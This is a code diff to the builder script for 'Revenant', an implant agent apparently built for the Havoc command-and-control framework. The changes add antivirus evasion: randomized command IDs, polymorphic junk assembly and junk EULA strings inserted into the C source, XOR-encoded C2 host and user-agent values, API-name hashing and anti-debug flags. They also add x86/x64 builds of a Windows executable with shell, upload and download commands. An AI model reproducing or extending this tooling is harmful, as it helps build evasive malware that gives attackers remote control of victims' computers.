@@ -10,14 +10,41 @@ from base64 import b64decode
 from havoc.service import HavocService
 from havoc.agent import *
 
-COMMAND_REGISTER: int = 0x100
-COMMAND_GET_JOB: int = 0x101
-COMMAND_NO_JOB: int = 0x102
-COMMAND_SHELL: int = 0x152
-COMMAND_UPLOAD: int = 0x153
-COMMAND_DOWNLOAD: int = 0x154
-COMMAND_EXIT: int = 0x155
-COMMAND_OUTPUT: int = 0x200
+'''
+#define COMMAND_REGISTER         0x100
+#define COMMAND_GET_JOB          0x101
+#define COMMAND_NO_JOB           0x102
+#define COMMAND_SHELL            0x152
+#define COMMAND_UPLOAD           0x153
+#define COMMAND_DOWNLOAD         0x154
+#define COMMAND_EXIT             0x155
+#define COMMAND_OUTPUT           0x200
+'''
+
+RANDOM_COMMANDS = True
+
+COMMAND_REGISTER = 0x100
+COMMAND_GET_JOB = 0x101
+COMMAND_NO_JOB = 0x102
+COMMAND_SHELL = 0x152
+COMMAND_UPLOAD = 0x153
+COMMAND_DOWNLOAD = 0x154
+COMMAND_EXIT = 0x155
+COMMAND_OUTPUT = 0x200
+
+
+def generate_command_constants():
+
+    COMMAND_REGISTER = random.randint(0, 0xFFFF)
+    COMMAND_GET_JOB = random.randint(0, 0xFFFF)
+    COMMAND_NO_JOB = random.randint(0, 0xFFFF)
+    COMMAND_SHELL = random.randint(0, 0xFFFF)
+    COMMAND_UPLOAD = random.randint(0, 0xFFFF)
+    COMMAND_DOWNLOAD = random.randint(0, 0xFFFF)
+    COMMAND_EXIT = random.randint(0, 0xFFFF)
+    COMMAND_OUTPUT = random.randint(0, 0xFFFF)
+
+    return (COMMAND_REGISTER, COMMAND_GET_JOB, COMMAND_NO_JOB, COMMAND_SHELL, COMMAND_UPLOAD, COMMAND_DOWNLOAD, COMMAND_EXIT, COMMAND_OUTPUT)
 
 
 GENERATED_PASSWORD: str = ''.join(random.choices(string.ascii_letters, k=16))
@@ -28,8 +55,33 @@ seed_str: str = ''.join(random.choices(string.ascii_letters, k=8))
 GENERATED_SEED = int(binascii.crc32(seed_str.encode())) # 0xDEADDEAD
 
 directory_path = "./Agent/Source/"
+
+#x86
+instructions_x86 = [
+    "nop;",
+    "mov eax, eax;",
+    "mov ecx, ecx;",
+    "mov edx, edx;",
+    "inc eax;",
+    "dec eax;",
+    "xor eax, eax;",
+    "xor ecx, ecx;",
+    "cmp eax, eax;",
+    "test eax, eax;",
+    ''"xor eax,eax;" \
+    "xor ecx,ecx;" \
+    "xor eax,eax;" \
+    "xor ecx,ecx;" \
+    "xor eax,eax;" \
+    "xor ecx,ecx;" \
+    "xor eax,eax;"''
+]
+
+
+
+#x64
 # Volatile registers: rax, rcx, rdx, r8, r9
-instructions = [
+instructions_x64 = [
     "nop",
     "mov eax, ebx",
     "mov eax, ecx",
@@ -64,7 +116,40 @@ instructions = [
     "popfq;"''
 ]
 
+eula = ["MICROSOFT SOFTWARE LICENSE TERMS", \
+        "(MVLTECHNOLOGIES1.0 – STABLE CHANNEL)", \
+        "MICROSOFT VISUAL STUDIO COMMUNITY 2019", \
+        "These license terms are an agreement between", \
+        "Microsoft Corporation (or based on where you live,", \
+        "one of its affiliates) and you. Please read them.", \
+        "They apply to the software named above, which", \
+        "includes the media on which you received it, if", \
+        "any. The terms also apply to any Microsoft", \
+        "updates,", "supplements,", "Internet-based services,", \
+        "and support services", "for", "this software, unless", \
+        "other terms accompany those items. If so, those", \
+        "terms apply.", "BY USING THE SOFTWARE, YOU ACCEPT", \
+        "THESE TERMS. IF YOU DO NOT ACCEPT THEM, DO NOT", \
+        "USE THE SOFTWARE. INSTEAD, RETURN IT TO THE", \
+        "RESELLER FOR A REFUND OR CREDIT.", "As described", \
+        "below,", "using the software also operates as your", \
+        "consent", "to the transmission of certain", \
+        "computer", "information", "for Internet-based", \
+        "services,", "as", "described", "in the privacy", \
+        "statement", "described in Section 3. If you", \
+        "comply with these license terms, you have the", \
+        "rights below.", "1. INSTALLATION AND USE RIGHTS.", \
+        "a. Individual license. If you are an individual", \
+        "working on your own applications to sell or for", \
+        "any other purpose,", "you may use the software to", \
+        "develop", "and test", "those applications."]
+
+
 plain_function_strings = [
+    "#define DeviceIoControl_CRC32B                 \"DeviceIoControl\"",
+    "#define CreateFileW_CRC32B                     \"CreateFileW\"",
+    "#define GetSystemInfo_CRC32B                   \"GetSystemInfo\"",
+    "#define GlobalMemoryStatusEx_CRC32B            \"GlobalMemoryStatusEx\"",
     "#define RtlRandomEx_CRC32B                     \"RtlRandomEx\"",
     "#define RtlGetVersion_CRC32B                   \"RtlGetVersion\"",
     "#define RtlInitUnicodeString_CRC32B            \"RtlInitUnicodeString\"",
@@ -104,7 +189,7 @@ plain_strings = [
     "#define S_COMMAND_DOWNLOAD       \"command download\"",
     "#define S_COMMAND_EXIT           \"command exit\"",
     "#define S_WINHTTP                \"winhttp\"",
-    "#define S_KERNEL32               \"kernel32\"",
+    "#define S_KERNEL32               \"kernel32.dll\"",
     "#define S_MARKER_MASK            \"xxxxxxxxxxxxxxxxxxxxxxxx\""
 
 ]
@@ -124,9 +209,10 @@ def crc32b(s: str):
 
 
 def xor_encode(s: str) -> str:
+    s_with_null_byte = s + "\x00"
     password_bytes: bytes = GENERATED_PASSWORD.encode()
-    password_cycle: bytes = (password_bytes * (len(s) // len(password_bytes) + 1))[:len(s)]
-    xor_bytes: bytes = bytes(b1 ^ b2 for b1, b2 in zip(s.encode(), password_cycle))
+    password_cycle: bytes = (password_bytes * (len(s_with_null_byte) // len(password_bytes) + 1))[:len(s_with_null_byte)]
+    xor_bytes: bytes = bytes(b1 ^ b2 for b1, b2 in zip(s_with_null_byte.encode(), password_cycle))
     return ", ".join(f"0x{b:02x}" for b in xor_bytes)
 
 
@@ -165,6 +251,41 @@ def encode_strings(strings):
     return "\n".join(encoded_strings)
 
 
+def write_command_header_file():
+
+    header_file_contents = f"""#ifndef REVENANT_COMMAND_H
+#define REVENANT_COMMAND_H
+
+#include <windows.h>
+#include "Parser.h"
+
+#define COMMAND_REGISTER         {COMMAND_REGISTER}
+#define COMMAND_GET_JOB          {COMMAND_GET_JOB}
+#define COMMAND_NO_JOB           {COMMAND_NO_JOB}
+#define COMMAND_SHELL            {COMMAND_SHELL}
+#define COMMAND_UPLOAD           {COMMAND_UPLOAD}
+#define COMMAND_DOWNLOAD         {COMMAND_DOWNLOAD}
+#define COMMAND_EXIT             {COMMAND_EXIT}
+#define COMMAND_OUTPUT           {COMMAND_OUTPUT}
+
+typedef struct {{
+    INT ID;
+    VOID (*Function)(PPARSER Arguments);
+}} RVNT_COMMAND;
+
+VOID CommandDispatcher();
+VOID CommandShell(PPARSER Parser);
+VOID CommandUpload(PPARSER Parser);
+VOID CommandDownload(PPARSER Parser);
+VOID CommandExit(PPARSER Parser);
+
+#endif //REVENANT_COMMAND_H
+"""
+    for filepath in glob.iglob('**/Command.h', recursive=True):
+        with open(filepath, 'w') as file:
+            file.write(header_file_contents)
+
+
 def replace_in_file(filename, old_string, new_string):
     with open(filename, "r+") as f:
         file_contents = f.read()
@@ -181,28 +302,28 @@ def process_strings_h():
             f.write(strings_file)
 
 def process_config_h(config: dict):
-    config_user_agent:         str = config['Options']['Listener']['UserAgent']
-    config_host_bind:          str = config['Options']['Listener']['HostBind']
-    config_host_port:          str = config['Options']['Listener']['Port']
+    config_user_agent:         str = xor_encode(config['Options']['Listener']['UserAgent'])
+    config_host_bind:          str = xor_encode(config['Options']['Listener']['HostBind'])
+    config_host_port:          str = config['Options']['Listener']['PortBind']
     config_host_secure:        str = str(config['Options']['Listener']['Secure']).upper()
     config_sleep:              str = config['Config']['Sleep']
     config_poly:               str = str(config['Config']['Polymorphic'])
     config_obf_strings:        str = str(config['Config']['Obfuscation'])
     config_arch:               str = config['Options']['Arch']
-    config_native:             str = str(config['Config']['Native'])
-    config_anti_debug:         str = str(config['Config']['AntiDebug'])
+    config_native:             str = str(config['Config']['Native']).upper()
+    config_anti_debug:         str = str(config['Config']['AntiDebug']).upper()
 
     header_file = f'''
-#define CONFIG_USER_AGENT L"{config_user_agent}"
-#define CONFIG_HOST L"{config_host_bind}"
+#define CONFIG_USER_AGENT {{{config_user_agent}}}
+#define CONFIG_HOST {{{config_host_bind}}}
 #define CONFIG_PORT {config_host_port}
 #define CONFIG_SECURE {str(config_host_secure).upper()}
 #define CONFIG_SLEEP {config_sleep} 
 #define CONFIG_POLYMORPHIC {str(config_poly).upper()}  
 #define CONFIG_OBFUSCATION {str(config_obf_strings).upper()}
 #define CONFIG_ARCH {config_arch}  
-#define CONFIG_NATIVE {config_native}
-#define CONFIG_ANTI_DEBUG {config_anti_debug}
+#define CONFIG_NATIVE {str(config_native).upper()}
+#define CONFIG_ANTI_DEBUG {str(config_anti_debug).upper()}
     '''
 
     for filepath in glob.iglob('**/Config.h', recursive=True):
@@ -308,21 +429,22 @@ class Revenant(AgentType):
     def __init__(self):
         self.Name: str = "Revenant"
         self.Author: str = "0xTriboulet for Malicious Group"
-        self.Version: str = "0.3"
-        self.Description: str = "Revenant Agent Testing"
+        self.Version: str = "0.49"
+        self.Description: str = "Revenant"
         self.MagicValue = 0x72766e74
 
-        self.Arch: list = ["x64", "x86"]
+        self.Arch: list = ["64", "86"]
         self.Formats: list = [
             {"Name": "Windows Exe", "Extension": "exe"},
-            {"Name": "Windows DLL", "Extension": "dll"}   # Not supported yet
+            #{"Name": "Windows DLL", "Extension": "dll"}   # Not supported yet
         ]
         self.BuildingConfig: dict = {
             "Sleep": "10",
             "Polymorphic": True,
             "Obfuscation": True,
             "Native"    : True,
-            "AntiDebug" : True
+            "AntiDebug" : True,
+            "RandCmdIds": True
         }
         self.Commands: list = [
             CommandShell(),
@@ -335,7 +457,7 @@ class Revenant(AgentType):
         print(f"[*] Building Revenant Agent {self.Version}")
         # print(f"config: {config}")
 
-        self.builder_send_message(config['ClientID'], "Info", f"hello from service builder")
+        self.builder_send_message(config['ClientID'], "Info", f"Hello - From Service Builder")
         self.builder_send_message(config['ClientID'], "Info", f"Options Config: {config['Options']}")
         self.builder_send_message(config['ClientID'], "Info", f"Agent Config: {config['Config']}")
 
@@ -345,40 +467,75 @@ class Revenant(AgentType):
         print("[*] Configuring Config.h header...")
         process_config_h(config)
 
-        if self.BuildingConfig["Obfuscation"]:
+        if config['Config']['RandCmdIds']:
+            write_command_header_file()
+            print("[*] Configuring Command.h header...")
+
+        if config['Config']['Obfuscation']:
             process_strings_h()
             print("[*] Configuring String.h header...")
 
-        if self.BuildingConfig["Polymorphic"]:
-            process_directory(directory_path, instructions, False)
-            print("[*] Configuring source files...")
+        if config['Options']['Arch'] == "64":
 
-        # compile_command: str = "cd ./Agent && make"
-        compile_command: str = "cmake . && cmake --build . -j 1"
+            if config['Config']['Polymorphic']:
+                process_directory(directory_path, instructions_x64, eula, False)
+                print("[*] Configuring source files x64...")
 
-        try:
-            process = subprocess.run(compile_command,
-                                     shell=True,
-                                     check=True,
-                                     stdout=subprocess.PIPE,
-                                     stderr=subprocess.PIPE,
-                                     universal_newlines=True)
+            compile_command: str = "cmake -DARCH=x64 . && cmake --build . -j 1"
 
-            if self.BuildingConfig["Polymorphic"]:
-                process_directory(directory_path, instructions, True)
-                print("[*] Cleaning up source files...")
+            try:
+                process = subprocess.run(compile_command,
+                                         shell=True,
+                                         check=True,
+                                         stdout=subprocess.PIPE,
+                                         stderr=subprocess.PIPE,
+                                         universal_newlines=True)
 
-            print(process.stdout)
-        except subprocess.CalledProcessError as error:
-            print(f"Error occurred: {error.stderr}")
+                if config['Config']['Polymorphic']:
+                    process_directory(directory_path, instructions_x64, eula, True)
+                    print("[*] Cleaning up source files...")
 
-            if self.BuildingConfig["Polymorphic"]:
-                process_directory(directory_path, instructions, True)
-                print("[*] Cleaning up source files...")
+                print(process.stdout)
+            except subprocess.CalledProcessError as error:
+                print(f"Error occurred: {error.stderr}")
 
-            return
+                if config['Config']['Polymorphic']: # Retain poly for debugging
+                    #process_directory(directory_path, instructions_x64, True)
+                    print("[*] !! NOT Cleaning up source files !!")
 
-        data = open("Agent/Bin/Revenant.exe", "rb").read()
+                return
+            data = open("Agent/Bin/x64/Revenant.exe", "rb").read()
+
+        elif config['Options']['Arch'] == "86":
+            compile_command: str = "cmake -DARCH=x86 . && cmake --build . -j 1"
+
+            if config['Config']['Polymorphic']:
+                process_directory(directory_path, instructions_x86, eula, False)
+                print("[*] Configuring source files x86...")
+
+            try:
+                process = subprocess.run(compile_command,
+                                         shell=True,
+                                         check=True,
+                                         stdout=subprocess.PIPE,
+                                         stderr=subprocess.PIPE,
+                                         universal_newlines=True)
+
+                if config['Config']['Polymorphic']:
+                    process_directory(directory_path, instructions_x86, eula, True)
+                    print("[*] Cleaning up source files...")
+
+                print(process.stdout)
+            except subprocess.CalledProcessError as error:
+                print(f"Error occurred: {error.stderr}")
+
+                if config['Config']['Polymorphic']:
+                    process_directory(directory_path, instructions_x64, eula, True)
+                    print("[*] Cleaning up source files...")
+
+                return
+
+            data = open("Agent/Bin/x86/Revenant.exe", "rb").read()
 
         # Below line sends the build executable back to Havoc for file management - 0xtriboulet
         self.builder_send_payload(config['ClientID'], self.Name + "." + self.Formats[0]["Extension"], data)
@@ -476,7 +633,24 @@ class Revenant(AgentType):
         return b''
 
 
+def insert_asm_before_vars(file_contents, instructions):
+    return_pattern = re.compile(r"^\s*(?P<type>\w+)\s+(?P<var_name>\w+)\s*=\s*(?P<value>[^;]+)\s*;", re.MULTILINE)
+
+    def insert_asm(match):
+        num_statements = random.randint(0, 1)
+        asm_statements = "\n".join(
+            "//remove me\nasm(\"{}\");".format(random.choice(instructions)) for _ in range(num_statements)
+        )
+        return asm_statements + "\n" + match.group(0)
+
+    modified_contents = return_pattern.sub(insert_asm, file_contents)
+
+    return modified_contents
+
+
 def insert_asm_statements(file_contents, instructions):
+    modified_contents = insert_asm_before_vars(file_contents, instructions)
+
     function_pattern = re.compile(
         r"(?P<return_type>[\w\s\*]+)\s+(?P<func_name>\w+)\s*\((?P<params>[^\)]*)\)\s*\{",
         re.MULTILINE
@@ -489,9 +663,10 @@ def insert_asm_statements(file_contents, instructions):
         )
         return match.group(0) + "\n" + asm_statements
 
-    modified_contents = function_pattern.sub(insert_asm, file_contents)
+    modified_contents = function_pattern.sub(insert_asm, modified_contents)
 
     return modified_contents
+
 
 def remove_asm_statements(file_contents):
     # Regex pattern to match and remove lines after "//remove me" comments
@@ -500,30 +675,58 @@ def remove_asm_statements(file_contents):
     return modified_contents
 
 
-def process_c_file(file_path, instructions, remove=False):
+
+def insert_string_declarations(file_contents, eula):
+    function_pattern = re.compile(
+        r"(?P<return_type>[\w\s\*]+)\s+(?P<func_name>\w+)\s*\((?P<params>[^\)]*)\)\s*\{",
+        re.MULTILINE
+    )
+
+    def insert_string(match):
+        num_statements = random.randint(1, 50)
+        string_statements = "\n".join(
+            "//remove me\nchar *str{} = \"{}\";".format(random.randint(10000, 99999), random.choice(eula)) for _ in range(num_statements)
+        )
+        return match.group(0) + "\n" + string_statements
+
+    modified_contents = function_pattern.sub(insert_string, file_contents)
+
+    return modified_contents
+
+def remove_string_declarations(file_contents):
+    # Regex pattern to match and remove lines after "//remove me" comments
+    remove_pattern = re.compile(r"//remove me\nchar \*str\d+ = \".*?\";\n?", re.MULTILINE)
+    modified_contents = remove_pattern.sub("", file_contents)
+    return modified_contents
+
+
+def process_c_file(file_path, instructions, eula, remove=False):
     with open(file_path, 'r') as input_file:
         file_contents = input_file.read()
 
     if remove:
         modified_contents = remove_asm_statements(file_contents)
+        modified_contents = remove_string_declarations(modified_contents)
     else:
         modified_contents = insert_asm_statements(file_contents, instructions)
+        modified_contents = insert_string_declarations(modified_contents, eula)
 
     with open(file_path, 'w') as output_file:
         output_file.write(modified_contents)
 
 
-def process_directory(directory_path, instructions, remove=False):
+def process_directory(directory_path, instructions, eula, remove=False):
     for filename in os.listdir(directory_path):
         if filename.endswith('.c'):
             file_path = os.path.join(directory_path, filename)
-            process_c_file(file_path, instructions, remove)
+            process_c_file(file_path, instructions, eula, remove)
+
 def main():
     havoc_revenant: Revenant = Revenant()
 
     print("[*] Connect to Havoc service api")
     havoc_service = HavocService(
-        endpoint="ws://127.0.0.1:40056/service-endpoint",
+        endpoint="wss://127.0.0.1:40056/service-endpoint",
         password="service-password"
     )
 
